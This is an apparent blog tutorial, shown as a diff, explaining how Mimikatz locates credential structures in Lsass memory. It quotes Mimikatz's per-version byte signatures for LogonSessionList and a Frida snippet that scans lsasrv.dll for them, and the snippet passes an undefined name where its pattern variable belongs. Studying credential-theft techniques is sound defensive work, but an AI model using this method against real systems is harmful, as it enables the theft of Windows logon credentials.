@@ -17,3 +17,36 @@ If you are interested in exploring this subject further or get stuck on your own
 ## Needles and Haystacks
 
 Previously, we used Frida's Interceptor to attach to the *LsaApLogonUserEx2()* function and intercept credentials as they were passed to it. Having access to debugging functionality makes this an easy thing to do, but Mimikatz doesn't have that luxury. It needs to directly scan the memory allocated to the Lsass process, and somehow identify exactly where those credentials are stored. Only then can it actually begin parsing and decrypting those structures in memory.
+
+We can look at the [Mimikatz source code](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c) to figure out exactly how it accomplishes this. The answer is simpler than you may think - a hardcoded set of signatures is used to scan memory for the regions we're interested in. These signatures are obviously platform-dependent and are liable to change between different versions of Windows, so Mimikatz keeps several on them on-hand. Here is an example from the Mimikatz source:
+
+```c
+#elif defined(_M_X64)
+BYTE PTRN_WIN5_LogonSessionList[]	= {0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8};
+BYTE PTRN_WN60_LogonSessionList[]	= {0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84};
+BYTE PTRN_WN61_LogonSessionList[]	= {0x33, 0xf6, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84};
+BYTE PTRN_WN63_LogonSessionList[]	= {0x8b, 0xde, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05};
+BYTE PTRN_WN6x_LogonSessionList[]	= {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74};
+BYTE PTRN_WN1703_LogonSessionList[]	= {0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74};
+BYTE PTRN_WN1803_LogonSessionList[] = {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74};
+BYTE PTRN_WN11_LogonSessionList[]	= {0x45, 0x89, 0x34, 0x24, 0x4c, 0x8b, 0xff, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74};
+```
+
+We can use these precompiled signatures in our own code, although we could also deduce them ourselves using a debugger such as IDA or WinDBG if we needed to. All we need is a way to scan memory for a specific sequence of bytes, which happily Frida provides for us:
+
+```javascript
+var lsasrv = Process.getModuleByName("lsasrv.dll")
+var sequence = "33 ff 41 89 37 4c 8b f3 45 85 c9 74"; 
+
+Memory.scan(lsasrv.base, lsasrv.size, WLsaEnumerateLogonSession, {
+	onMatch(signature, size) {
+		console.log("Found a match at " + signature);
+	}
+});
+```
+
+With that, we have a way to scan the memory space of *lsasrv.dll* for those specific sequences. Mimikatz uses these signatures to deduce the address of specific global variables that contain sensitive data, and that's what we're going to need to do as well.
+
+## Finding LogonSessionList
+
+TODO
